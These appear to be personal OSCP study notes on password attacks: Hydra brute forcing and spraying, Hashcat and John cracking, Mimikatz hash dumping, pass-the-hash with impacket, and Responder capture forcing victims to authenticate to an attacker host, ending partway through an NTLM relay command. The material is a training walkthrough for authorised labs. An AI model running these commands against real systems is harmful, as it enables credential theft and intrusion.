---
tags: OSCP Modules
---

# Module 16: Password Attacks

## Tags
#OSCP #Module16 #PasswordAttacks #Hydra #Rockyou #PasswordCracking #Hashcat #JohnTheRipper #BruteForce #DictionaryAttack #PasswordSpraying #NetworkServices #SSH #RDP #HTTPBruteForce #Hashing #Encryption #Symmetric #Asymmetric #MD5 #SHA1 #SHA256 #bcrypt #NTLM #NetNTLMv2 #Mimikatz #SAM #LSASS #PassTheHash #PtH #Responder #NTLMRelay #KeePass #PasswordManager #SSHPrivateKey #CredentialGuard #VBS #HyperV #VSM #SSPI #Windows #Wordlist #RuleBasedAttack #Keyspace #HashRate #RainbowTable #SYSKEY #SeDebugPrivilege #impacket

---

## **Why This Module Matters**

Getting credentials is often how penetration tests actually move forward. Not with a flashy zero-day, but with a password that was reused, cracked from a database dump, or captured off the wire.

This module covers the full offensive credential lifecycle: attacking exposed services directly (brute force and spraying), cracking hashes once they've been obtained, and then using those credentials or hashes to move laterally. The Windows-specific material (NTLM, Mimikatz, Responder, relay attacks) is foundational for almost every real-world Windows engagement.

The module also introduces Credential Guard, which matters because modern enterprise Windows deployments are increasingly enabling it by default, so knowing the bypass technique is worth understanding now rather than encountering it cold in a lab.

Password attacks are low-noise compared to exploitation when done carefully, and the payoff (valid credentials) is often higher value than a shell on one box. These are bread-and-butter OSCP skills.

---

## 16.1. Attacking Network Service Logins

### 16.1.1. SSH

**Hydra** is the standard tool for dictionary attacks against network services. It supports a wide range of protocols (SSH, RDP, FTP, HTTP, SMB, and more) and is pre-installed on Kali. The `rockyou.txt` wordlist (14 million+ entries) lives at `/usr/share/wordlists/rockyou.txt.gz` and needs decompressing before first use.

The difference between a brute-force attack (every possible character combination) and a dictionary attack (only words from a wordlist) matters for time planning. Against SSH, pure brute force is rarely feasible -- dictionary attacks with rockyou.txt are the practical starting point.

```bash
# Decompress rockyou.txt (first-time only)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Verify target is running SSH on the expected port first
sudo nmap -sV -p 2222 <target-ip>

# Dictionary attack: single username, rockyou wordlist, non-standard port
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<target-ip>
```

Key Hydra flags:
| Flag | Meaning |
|---|---|
| `-l <name>` | Single username (lowercase L) |
| `-L <file>` | Username list (uppercase L) |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-s <port>` | Non-standard port |
| `-t <n>` | Number of parallel tasks |

> 🔍 **Worth remembering generally:** the username format tells you things. If a discovered account is `george`, the org may use first names as usernames throughout. That's information gathering that feeds directly into spray attacks later.

> 📸 Screenshot: Hydra output showing `[2222][ssh] host: <target> login: george password: <cracked>` -- the single line that confirms a valid credential

**Lab status: ✅ Completed**

**VM #1 (192.168.158.201) — dictionary attack against SSH port 2222:**

```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.158.201
# [2222][ssh] host: 192.168.158.201   login: george   password: chocolate
# Completed in ~8 seconds

ssh george@192.168.158.201 -p 2222
# Password: chocolate

george@32ee16154367:~$ cat flag.txt
OS{3eb5b3d6448c356e238bde05730d05d2}
```

#### Tags: #SSH #Hydra #DictionaryAttack #Rockyou #Module16

---

### 16.1.2. RDP

**Password spraying** inverts the usual dictionary attack: instead of many passwords against one username, you try one password against many usernames. This is the right approach when you have a credential (from a leak database, a previous compromise, or found in plaintext) and want to find where it works across an environment.

Spraying reduces the risk of account lockout because each individual account only sees one failed attempt. A traditional brute force hammering one account will trigger lockout policies; a spray typically won't.

```bash
# Append specific usernames to the names wordlist before spraying
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

# Password spray: username list, single password, RDP target
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://<target-ip>
```

> 🔧 **Technique:** RDP limits Hydra to 4 parallel tasks (versus 16 for SSH). This is a protocol-level restriction, not a Hydra issue -- don't try to override it with `-t 16`, it won't improve speed against RDP.

> 🔍 **Worth remembering generally:** dictionary attacks generate significant log noise: failed authentication events, potential IDS alerts, and possible account lockout. Before spraying broadly, check whether the target environment enforces lockout policies. Locking out production accounts during a pentest is a serious problem. Three failed logins is a common lockout threshold -- a single-password spray stays safely under it per account.

> 🔍 **Worth remembering generally:** `ScatteredSecrets` and similar credential leak databases can provide real plaintext passwords from past breaches. These are legitimate pentest tools when used with client authorisation, but check the legal status of each service carefully. `WeLeakInfo` was seized by the FBI. Review terms of service before using any of these.

> 📸 Screenshot: Hydra finding valid credentials from the spray (`[3389][rdp] host: <target> login: daniel password: SuperS3cure1337#`)

**Lab status:** (Q1 + Q2 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - RDP - VM #1 (spray SuperS3cure1337# against username list, find flag on desktop; then enumerate for another network service, attack as itadmin) ⬜ Pending

#### Tags: #RDP #Hydra #PasswordSpraying #AccountLockout #Module16

---

### 16.1.3. HTTP POST Login Form

Attacking HTTP login forms requires more setup than SSH or RDP. Hydra needs two things it can't figure out on its own: the exact POST request body (field names vary per application) and a string from the response that indicates a failed login.

```mermaid
flowchart LR
    A["Open Burp Suite\nIntercept ON"] --> B["Submit login attempt\nin browser"]
    B --> C["Capture POST request\nNote request body fields"]
    C --> D["Forward request\nCheck browser for failure message"]
    D --> E["Note failure string\ne.g. 'Login failed. Invalid'"]
    E --> F["Assemble Hydra command\nhttp-post-form with 3 fields"]
    F --> G["Run Hydra\nwaits for no failure string in response"]
    style G fill:#2e7d32,color:#fff
```

The Hydra `http-post-form` argument takes three colon-separated fields:
1. Path to the login form (e.g. `/index.php`)
2. POST body with `^USER^` and `^PASS^` placeholders
3. Failed login indicator (a string that appears in failed response)

```bash
# Full Hydra HTTP POST form attack
hydra -l user -P /usr/share/wordlists/rockyou.txt <target-ip> \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

> 🔧 **Technique:** choose the failure indicator carefully. Avoid generic words like "password" or "username" that might also appear in a successful response (e.g. a welcome page saying "Your username is..."). Shorten the string to the unique part. "Login failed. Invalid" is safer than the full error message.

> 🔍 **Worth remembering generally:** WAFs and `fail2ban` are common protections against HTTP brute force. fail2ban watches for repeated failed login events and can block an IP after just 3-5 attempts. Many web services run without either, making this a very effective attack vector. Know which defensive technology might be present before starting.

> 📸 Screenshot: Burp intercepting the POST request showing the request body fields to extract for the Hydra command

> 📸 Screenshot: Hydra output finding the valid password, then the browser confirming a successful login to TinyFileManager

> 🔗 **RevShells** -- once inside a web file manager, you'll often want to escalate to a shell: [revshells.com](https://revshells.com)

**Lab status:** (Q1 + Q2 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - HTTP POST Login Form - VM #1 (TinyFileManager, user account, rockyou.txt, find flag inside); VM #2 (admin account, identify correct password via Hydra) ⬜ Pending

#### Tags: #HTTPBruteForce #Hydra #BurpSuite #TinyFileManager #POSTForm #Fail2Ban #Module16

---

## 16.2. Password Cracking Fundamentals

### 16.2.1. Introduction to Encryption, Hashes and Cracking

**Encryption vs hashing** is a foundational distinction.

**Encryption** is two-way: data is scrambled with a key and can be unscrambled with the same key (symmetric) or the matching key (asymmetric).
- **Symmetric:** same key for encrypt and decrypt (AES). Both parties must share the key, which creates key exchange risk.
- **Asymmetric:** key pair (public + private). Encrypt with recipient's public key, only their private key decrypts. RSA is the canonical example. The public key can be shared freely because it can only encrypt, not decrypt.

**Hashing** is one-way: the hash function converts any input into a fixed-length digest. Trivial to compute forward, computationally prohibitive to reverse. Identical inputs always produce identical outputs. Even a one-character difference produces a completely different hash.

```mermaid
flowchart LR
    subgraph Symmetric["Symmetric Encryption (AES)"]
        direction LR
        P1["Plaintext"] -->|"Encrypt with Key A"| C1["Ciphertext"]
        C1 -->|"Decrypt with Key A"| P1
    end
    subgraph Asymmetric["Asymmetric Encryption (RSA)"]
        direction LR
        P2["Plaintext"] -->|"Encrypt with Public Key"| C2["Ciphertext"]
        C2 -->|"Decrypt with Private Key"| P2
    end
    subgraph Hashing["Hashing (one-way)"]
        direction LR
        P3["Plaintext"] -->|"SHA-256 / MD5"| H["Hash digest\nfixed-length hex"]
        H -.->|"Cannot reverse"| X["❌"]
    end
```

**Password cracking** is the process of determining a plaintext from its hash by repeatedly hashing candidate plaintexts and comparing results. It does not reverse the hash function; it finds a matching input.

Two main tools:
- **Hashcat:** primarily GPU-based, faster for most algorithms. Requires OpenCL or CUDA for GPU mode. Use `--force` on Kali VMs without GPUs.
- **John the Ripper (JtR):** primarily CPU-based, also supports GPUs. Handles some algorithms and file formats that Hashcat doesn't (and vice versa). Worth knowing both.

**Calculating cracking time:**

```
cracking_time = keyspace / hash_rate
keyspace = charset_size ^ password_length
```

```bash
# Count characters in a charset
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
# → 62

# Calculate keyspace for 5-char password
python3 -c "print(62**5)"
# → 916,132,832

# Benchmark hash rates on your hardware
hashcat -b
```

CPU vs GPU benchmark comparison from module examples (RTX 3090 vs i9-10885H):

| Algorithm | GPU (RTX 3090) | CPU (i9-10885H) | GPU speedup |
|---|---|---|---|
| MD5 | 68,185.1 MH/s | 450.8 MH/s | ~151x |
| SHA1 | 21,528.2 MH/s | 298.3 MH/s | ~72x |
| SHA-256 | 9,276.3 MH/s | 134.2 MH/s | ~69x |

```bash
# Cracking time for 5-char password, SHA-256, GPU (seconds)
python3 -c "print(916132832 / 9276300000)"
# → 0.099 seconds

# Cracking time for 8-char password, SHA-256, GPU
python3 -c "print(62**8 / 9276300000)"
# → 23,537 seconds ≈ 6.5 hours

# Cracking time for 10-char password, SHA-256, GPU
python3 -c "print(62**10 / 9276300000)"
# → 90,477,816 seconds ≈ 2.8 years
```

> 🔍 **Worth remembering generally:** increasing password length increases cracking time **exponentially** (each additional character multiplies the keyspace by the charset size). Increasing complexity (charset size) only increases it **polynomially**. This is why a 12-character password made of only lowercase letters is much stronger than an 8-character password with every special character. Password policies mandating length are more effective than those mandating complexity.

> 📸 Screenshot: `hashcat -b` benchmark output showing MH/s rates -- reference for your specific hardware rather than the module's example values

**Lab status: ✅ Completed** (Q1-Q4 pure-recall):

| Question | Answer |
|---|---|
| True or false: In symmetric encryption, one key is used for both encryption and decryption | **True** -- symmetric uses the same key for both operations (AES is the example) |
| True or false: In asymmetric encryption, we can share the private key freely | **False** -- the *public* key is shared freely; the private key must remain secret. Sharing the private key breaks the entire model |
| True or false: A cryptographic hash function is a one-way function | **True** -- proper hash algorithm implementations make it computationally prohibitive to recover plaintext from the hash |
| Use MD5 GPU hash rate (68,185.1 MH/s) and charset of all lower + upper case English letters (52 chars), password length 8. Cracking time in full minutes? | **13 minutes** (52^8 = 53,459,728,531,456; / 68,185,100,000 = 784 seconds; / 60 = 13.07 → **13 full minutes**) |

#### Tags: #Encryption #Hashing #Hashcat #JohnTheRipper #Keyspace #HashRate #MD5 #SHA256 #GPU #CPU #Module16

---

### 16.2.2. Mutating Wordlists

Most passwords in rockyou.txt don't satisfy common password policies (uppercase, number, special character). Rule-based attacks automate mutation of wordlist entries to produce variants that would.

Hashcat rules use **rule functions**: single characters or short sequences that define a transformation applied to each password.

Common rule functions:

| Function | Effect | Example |
|---|---|---|
| `$X` | Append character X | `$1` → password**1** |
| `^X` | Prepend character X | `^!` → **!**password |
| `c` | Capitalise first, lowercase rest | `c` → **P**assword |
| `u` | All uppercase | `u` → PASSWORD |
| `l` | All lowercase | `l` → password |
| `r` | Reverse the string | `r` → drowssap |
| `d` | Duplicate the string | `d` → passwordpassword |

**Rules on the same line** are applied consecutively to each password (all transformations, one output per input):

```
$1 c $!    →  password → Password1!
```

**Rules on separate lines** are treated as independent rules (each line produces a separate output for each input):

```
$1         →  password → password1
c          →  password → Password
```

```bash
# Create a rule file
echo '$1 c $!' > demo.rule

# Debug mode -- show mutations without cracking (--stdout)
hashcat -r demo.rule --stdout demo.txt

# Crack an MD5 hash with a rule-based attack
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force

# Pre-built Hashcat rule files
ls /usr/share/hashcat/rules/
# best66.rule, rockyou-30000.rule, dive.rule, d3ad0ne.rule ...
```

> 🔍 **Worth remembering generally:** when creating rules, think like a user forced to comply with a policy. Capital letter = first character capitalised. Numbers = append 1, 123, year. Special character = appended at the end, from the left side of the keyboard (`!`, `@`, `#`). Research shows `!` is the most common special character appended to passwords. Build your rules around these patterns before reaching for the generic mega-rules.

> 🔍 **Worth remembering generally:** `rockyou-30000.rule` was specifically designed for use with `rockyou.txt`. When cracking a hash that likely originated from that wordlist, this combination is especially effective.

> 📸 Screenshot: `hashcat --stdout` output showing the mutated passwords before using them against a real hash -- confirms the rule file is doing what you expect before running a long crack

**Lab status:** (Q1 + Q2 hands-on hash cracking, no VM required)

> 🚩 **Hands-on (no VM, needs Hashcat):** MD5 hash `056df33e47082c77148dba529212d50a` -- create a rule to append "1@3$5" to each rockyou.txt password and crack it ⬜ Pending

> 🚩 **Hands-on (no VM, needs Hashcat):** MD5 hash `19adc0e8921336d08502c039dc297ff8` -- create a rule that uppercases all letters and duplicates each rockyou.txt password and crack it ⬜ Pending

#### Tags: #RuleBasedAttack #Hashcat #Wordlist #MutateWordlist #PasswordPolicy #Module16

---

### 16.2.3. Cracking Methodology

A structured approach prevents wasted effort. Five steps, in order:

```mermaid
flowchart TD
    A["1. Extract hashes\nobtain hash from target system\n(SAM, database, file, etc.)"] --> B["2. Format hashes\nidentify algorithm, convert to\ntool-expected format if needed"]
    B --> C["3. Calculate cracking time\nkeyspace / hash_rate\nfeasible within pentest window?"]
    C --> D["4. Prepare wordlist\nmutate with rules, research password\npolicy, check leak databases"]
    D --> E["5. Attack the hash\nrun tool with correct mode,\nverify hash copied without extra whitespace"]
    style A fill:#1565c0,color:#fff
    style E fill:#2e7d32,color:#fff
```

**Identify the hash type** with `hash-identifier` or `hashid` (both on Kali). Some hashes are ambiguous -- MD2, MD4, and MD5 can look identical to automated tools. Cross-check results or look for context clues (where the hash came from, what system generated it).

**Hash formats** to know:

| Prefix / Length | Algorithm |
|---|---|
| 32 hex chars | MD5 (also MD2, MD4 -- need context) |
| 40 hex chars | SHA-1 |
| 64 hex chars | SHA-256 |
| `$2y$` or `$2b$` | bcrypt |
| `$6$` | SHA-512 crypt |
| `$keepass$` | KeePass database |
| `$sshng$6$` | SSH private key (SHA-512) |

> 🔍 **Worth remembering generally:** extra whitespace or newlines in a hash file silently break cracking attempts. The tool accepts the file, runs, and finds nothing -- not because the password isn't in the wordlist but because the hash doesn't match due to padding. Always `cat` the hash file and visually inspect it before running a long session.

**Lab status: ✅ Completed** (Q1 + Q2 pure-recall):

| Question | Answer |
|---|---|
| Identify the hash function of `e4f779a01b503a38dec0beeae4ac46c2222b2d91` | **SHA-1** -- 40 hex characters, the fixed output length of SHA-1 |
| Identify the hash function of `$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC` | **bcrypt** -- the `$2y$` prefix is the bcrypt identifier; `10` is the cost factor (number of rounds) |

#### Tags: #CrackingMethodology #HashIdentifier #Hashcat #JohnTheRipper #Module16

---

### 16.2.4. Password Manager

Password managers store all a user's credentials behind one master password. Compromising that master password gives access to everything the user has stored. `KeePass` stores its database as a `.kdbx` file -- a common finding on workstations during assessments.

**Step 1: Locate the database**
```powershell
# Search the whole drive for .kdbx files (PowerShell on target)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

**Step 2: Transfer the file to Kali** (via RDP shared drive, SMB, or any available channel)

**Step 3: Transform to Hashcat format**
```bash
# keepass2john formats the .kdbx for cracking tools
keepass2john Database.kdbx > keepass.hash

# keepass2john prepends "Database:" -- remove it before cracking
# (edit the file and delete "Database:" at the start)
cat keepass.hash
# Should start with: $keepass$*2*60*0*...
```

**Step 4: Find the Hashcat mode**
```bash
hashcat --help | grep -i "KeePass"
# → 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)
```

**Step 5: Crack it**
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

> 🔁 **Similar to:** the `keepass2john` transformation step follows the same pattern as `ssh2john` (next section) and the msfvenom format conversions in [[Fixing Exploits]]. Extract file, run `<format>2john`, strip the filename prefix, feed to the cracker. Once you've done it once, every `*2john` tool feels familiar.

> 🔍 **Worth remembering generally:** `rockyou-30000.rule` was built specifically for use with `rockyou.txt`. When the hash source is a typical user workstation and you have no other information about the password policy, this combination is the best first attempt -- it covers a huge variety of common mutations without taking forever.

> 📸 Screenshot: PowerShell `Get-ChildItem` output confirming the .kdbx file location
> 📸 Screenshot: Hashcat cracking the KeePass hash and revealing the master password
> 📸 Screenshot: KeePass open with the cracked password, showing the stored credentials list

**Lab status:** (Q1 + Q2 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Password Manager - VM #1 (SALESWK01, RDP as jason/lab, locate KeePass database, crack it, enter password titled "User Company Password") ⬜ Pending

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Password Manager - VM #2 (enumerate, gain access as user nadine, obtain password titled "flag" from password manager) ⬜ Pending

#### Tags: #KeePass #PasswordManager #Keepass2john #Hashcat #Module16

---

### 16.2.5. SSH Private Key Passphrase

SSH private keys should be confidential but often aren't. Directory traversal vulnerabilities, misconfigured web servers, and sloppy file permissions all provide paths to retrieve them. A passphrase-protected key is useless to an attacker who can't crack the passphrase.

**Step 1: Transform the key to a crackable hash**
```bash
chmod 600 id_rsa
ssh2john id_rsa > ssh.hash

# ssh2john prepends the filename -- strip it before cracking
# Remove "id_rsa:" from the start of ssh.hash
```

**Step 2: Identify the Hashcat mode**
```bash
# The hash starts with $sshng$6$ -- the $6$ indicates SHA-512
hashcat -h | grep -i "ssh"
# → 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)  | Private Key
```

**Step 3: Create a targeted wordlist and rules**

If you found a note listing someone's passwords or password habits, use that. Build a small custom wordlist from those passwords and a rule file based on any policy clues:

```bash
# Rule file based on "3 numbers, capital letter, special character" policy
cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

**Step 4: Try Hashcat first**
```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
# Hashcat 22921 does not support aes-256-ctr cipher
# "Token length exception" means the cipher type is unsupported -- switch to JtR
```

**Step 5: If Hashcat fails, use John the Ripper**

JtR supports aes-256-ctr (which modern SSH keys use). JtR reads its rules from `/etc/john/john.conf` -- add custom rules by appending them.

```bash
# Add the rule with a name to john.conf
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

# Crack with JtR
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

> 🔧 **Technique:** "Token length exception" from Hashcat for SSH hashes (mode 22921) means the key used `aes-256-ctr` as its cipher, which 22921 doesn't support. This is not a wordlist problem or a hash format problem. Switch to JtR immediately rather than debugging the Hashcat command.

> 🔁 **Similar to:** the tool-switching pattern here (Hashcat limitation, fall back to JtR) mirrors the approach in [[Fixing Exploits]] where a cross-compilation issue required switching between compilers. The principle is the same: know both tools, use the one that supports the specific format.

> 🔍 **Worth remembering generally:** users rarely change their password *patterns*, only their passwords. If someone's password list shows `rickc137`, they have a preference for appending numbers after a word. If one password starts with a capital letter, they're likely to capitalise future ones. Build rules around observed patterns before reaching for rockyou-30000.

> 📸 Screenshot: `john` output showing the cracked passphrase, then the successful SSH connection using the key

**Lab status:** (Q1 + Q2 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - SSH Private Key Passphrase - VM #1 (BRUTE, port 2222, crack dave's SSH key passphrase, find flag in home directory; also find way into port 2223 as alfred using same rules) ⬜ Pending

#### Tags: #SSHPrivateKey #Ssh2john #JohnTheRipper #Hashcat #Passphrase #AES256CTR #Module16

---

## 16.3. Working with Password Hashes

### 16.3.1. Cracking NTLM

Windows stores user password hashes in the **Security Account Manager (SAM)** database. The SYSKEY feature partially encrypts the SAM at rest, but once the system is running, Mimikatz can access the hashes from memory.

**LM vs NTLM:**
- **LM (LAN Manager):** extremely weak. Passwords are case-insensitive, max 14 characters, split into two 7-character halves hashed separately. Disabled by default since Windows Vista/Server 2008.
- **NTLM:** case-sensitive, no length restriction, not salted. The lack of salt means identical passwords produce identical hashes, which enables precomputation attacks (rainbow tables) and pass-the-hash.

```mermaid
flowchart TD
    subgraph SAM["SAM Database (C:\\Windows\\system32\\config\\sam)"]
        N["NTLM hashes\nstored per user\n(no salt)"]
    end
    subgraph LSASS["LSASS process (NT AUTHORITY\\SYSTEM)"]
        C["Cached NTLM hashes\nfrom logged-in sessions"]
    end
    M["Mimikatz\n(requires SeDebugPrivilege\nor SYSTEM)"] --> SAM
    M --> LSASS
    SAM --> H["hashcat -m 1000\ncrack NTLM hash"]
    LSASS --> P["Pass-the-hash\nreuse without cracking"]
```

**Extracting hashes with Mimikatz:**
```powershell
# Run PowerShell as Administrator on the target Windows system
cd C:\tools
.\mimikatz.exe
```

```
# Inside Mimikatz:
privilege::debug           # Enable SeDebugPrivilege (required)
token::elevate             # Escalate to SYSTEM token (required for lsadump::sam)
lsadump::sam               # Dump NTLM hashes from the SAM database

# Alternative: dumps all cached credentials including domain accounts
sekurlsa::logonpasswords
```

> 🔧 **Technique:** the SAM file cannot be copied while Windows is running (kernel holds an exclusive lock). Mimikatz bypasses this by reading it via the LSASS process memory, not directly from disk.

**Cracking the extracted hash on Kali:**
```bash
# Save the NTLM hash to a file (just the hash, no extra text)
cat nelly.hash
# 3ae8e5f0ffabb3a627672e1600f1ba10

# Find the Hashcat mode for NTLM
hashcat --help | grep -i "ntlm"
# → 1000 | NTLM | Operating System

# Crack with rockyou.txt and best66.rule
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best66.rule --force
```

> 🔍 **Worth remembering generally:** "NTLM hash" is the industry-common name for what Microsoft formally calls an NTHash. The distinction doesn't matter for OSCP but will come up when comparing documentation from different sources.

> 📸 Screenshot: Mimikatz output showing `lsadump::sam` revealing NTLM hashes for each user
> 📸 Screenshot: Hashcat cracking the NTLM hash and revealing the plaintext password

**Lab status:** (Q1 + Q2 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking NTLM - VM #1 (MARKETINGWK01, RDP as offsec/lab, Mimikatz to extract nelly's NTLM hash, crack it, find flag on nelly's desktop) ⬜ Pending

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking NTLM - VM #2 (RDP as nadine with password from Password Manager lab, extract Steve's NTLM hash with Mimikatz, crack with best66.rule, enter plaintext) ⬜ Pending

#### Tags: #NTLM #SAM #Mimikatz #LSASS #SeDebugPrivilege #Hashcat #PasswordCracking #Module16

---

### 16.3.2. Passing NTLM

**Pass-the-hash (PtH)** is possible because NTLM hashes are not salted and remain static across sessions. The same hash that authenticates a user today works tomorrow and next week, unless the password changes. This means a captured hash can be used directly for authentication without ever knowing the plaintext.

Two important constraints:
1. **UAC remote restrictions** (enabled by default since Windows Vista): prevents remote code execution using local administrator accounts other than the default `Administrator` account (RID 500). A local admin account that isn't the actual Administrator account can still authenticate via PtH to access shares, but cannot achieve code execution via psexec or wmiexec style tools.
2. **Same credentials across machines:** for PtH to work on a second machine, that machine must have an account with the same username AND password (same hash). This is common when sysadmins use the same local Administrator password everywhere.

```bash
# Access an SMB share using an NTLM hash (no plaintext password needed)
smbclient \\\\<target-ip>\\secrets -U Administrator \
  --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

# Inside smbclient:
# smb: \> dir
# smb: \> get secrets.txt

# Get an interactive SYSTEM shell via PtH (psexec always gives SYSTEM)
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b \
  Administrator@<target-ip>

# Get an interactive shell as the authenticated user (wmiexec gives the actual user)
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b \
  Administrator@<target-ip>
```

**impacket-psexec vs impacket-wmiexec:**
| Tool | Shell runs as | How it works |
|---|---|---|
| `impacket-psexec` | `NT AUTHORITY\SYSTEM` | Uploads .exe to writable share, registers as Windows service, starts it |
| `impacket-wmiexec` | The authenticated user | Uses WMI to execute commands, no file dropped to disk |

> 🔧 **Technique:** the LM hash portion in impacket commands (`00000000000000000000000000000000:`) can always be 32 zeros when only the NTLM hash is needed. LM is disabled on modern Windows. The format is always `LMhash:NThash`.

> 🔁 **Similar to:** the certutil LOLBIN delivery pattern in [[Client-Side Attacks]] -- both techniques repurpose a legitimate Windows capability (authenticating with hashes, or downloading files with certutil) as an offensive tool. The OS provides the primitive; you're just using it creatively. Also similar conceptually to [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|file delivery via legitimate mechanisms]].

> 🔍 **Worth remembering generally:** PtH against domain accounts is even more powerful. If you capture an Administrator hash on one workstation in a domain where the local Administrator password is shared across all workstations (a common enterprise misconfiguration), you can use that single hash to authenticate to every machine in the domain. This is why Microsoft released LAPS (Local Administrator Password Solution) to randomise local admin passwords per machine.

> 📸 Screenshot: smbclient successfully connecting to the SMB share using --pw-nt-hash and listing files
> 📸 Screenshot: impacket-psexec or wmiexec dropping to a shell showing `whoami` output confirming lateral movement

**Lab status:** (Q1 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Passing NTLM - VM Group 1 (extract Administrator hash from FILES01 using Mimikatz, use PtH to access FILES02, find flag on Administrator desktop) ⬜ Pending

#### Tags: #PassTheHash #PtH #NTLM #impacket #psexec #wmiexec #smbclient #UAC #Module16

---

### 16.3.3. Cracking Net-NTLMv2

**Net-NTLMv2** is the Windows network authentication protocol: a challenge-response mechanism used when one Windows machine authenticates to another over a network (SMB, HTTP, etc.). It involves:

1. Client sends authentication request
2. Server sends a random challenge
3. Client encrypts the challenge with its NTLM hash to produce a response
4. Server verifies the response

```mermaid
sequenceDiagram
    participant C as Client (victim)
    participant R as Responder (Kali SMB server)
    C->>R: SMB authentication request
    R->>C: Challenge (random value)
    C->>C: Encrypt challenge with NTLM hash
    C->>R: Response (contains encrypted challenge)
    Note over R: Responder captures the full<br/>Net-NTLMv2 hash structure
    R->>R: Print captured hash to terminal
    Note over R: Hash crackable offline<br/>with Hashcat mode 5600
```

**Responder** intercepts this process by acting as a rogue SMB server. When a Windows machine connects to it (even just a failed `dir \\kali-ip\anything` command), Responder captures the Net-NTLMv2 hash the client sent.

```bash
# Start Responder on your network interface (get interface with ip a)
sudo responder -I tap0

# On the victim (via bind shell, code execution, or any other vector):
# Force an authentication to your Responder listener
dir \\<kali-ip>\test
# "Access is denied" is expected -- Responder still captures the hash
```

Responder output:
```
[SMB] NTLMv2-SSP Username: FILES01\paul
[SMB] NTLMv2-SSP Hash: paul::FILES01:1f9d4c51f6e74653:795F138EC...
```

```bash
# Save the full hash line to a file
cat paul.hash

# Crack with Hashcat (mode 5600 for Net-NTLMv2)
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

> 🔧 **Technique:** Responder needs raw socket access for the various protocol servers it runs. Always run it with `sudo`. The interface name (`tap0`, `tun0`, `eth0`) must match your actual connected interface -- check with `ip a` first.

> 🔍 **Worth remembering generally:** unlike NTLM hashes (which are static and reusable), Net-NTLMv2 hashes are tied to a specific challenge-response exchange. You cannot pass a Net-NTLMv2 hash the same way you pass an NTLM hash. You must either crack it (to get the plaintext password) or relay it (in the same session, before it expires). If you can't crack it, the relay technique in the next section applies.

> 🔍 **Worth remembering generally:** Responder can also do LLMNR and NBT-NS poisoning (Mitre T1557) -- when a Windows machine can't resolve a hostname via DNS, it broadcasts a query to the local network. Responder responds to these broadcasts claiming to be the requested host, then captures the authentication. Extremely effective in internal assessments, and often overlooked as a detection gap.

> 📸 Screenshot: Responder's terminal output showing the captured Net-NTLMv2 hash for the victim user
> 📸 Screenshot: Hashcat cracking the Net-NTLMv2 hash and revealing the plaintext password
> 📸 Screenshot: RDP connection to the target as the cracked user, confirming the password is valid

**Lab status:** (Q1 + Q2 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking Net-NTLMv2 - VM #1 (FILES01, connect to bind shell on port 4444, use Responder to capture paul's hash, crack it, RDP to find flag on paul's desktop) ⬜ Pending

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Cracking Net-NTLMv2 - VM #2 (add marketingwk01 to /etc/hosts, exploit web application to trigger Net-NTLMv2 capture, crack hash, connect and find flag) ⬜ Pending

#### Tags: #NetNTLMv2 #Responder #NTLMCapture #Hashcat #LLMNR #NBT-NS #ChallengeResponse #Module16

---

### 16.3.4. Relaying Net-NTLMv2

When you can't crack a captured Net-NTLMv2 hash (complex password, long cracking time), you can **relay** it instead. Rather than recording the hash for offline cracking, you forward it in real time to a second target that accepts the same credentials.

```mermaid
sequenceDiagram
    participant V as Victim (FILES01)
    participant K as Kali (ntlmrelayx)
    participant T as Target (FILES02)
    V->>K: dir \\kali-ip\test → SMB auth request
    K->>T: Forward auth to FILES02
    T->>K: Challenge
    K->>V: Forward challenge
    V->>K: Response (Net-NTLMv2 hash)
    K->>T: Forward response
    T->>K: Auth accepted (if user has local admin on FILES02)
    K->>T: Execute -c command (reverse shell payload)
    T-->>K: Reverse shell connects to nc listener
```

**Constraints:**
- The relayed user must have local admin rights on the target machine to achieve code execution
- UAC remote restrictions must be disabled on the target, OR you must relay the local `Administrator` account (not a local admin group member)
- The target cannot be the same machine the authentication came from (you'd be relaying to yourself)

```bash
# Start ntlmrelayx: intercepts SMB auth and relays it to target
impacket-ntlmrelayx --no-http-server -smb2support \
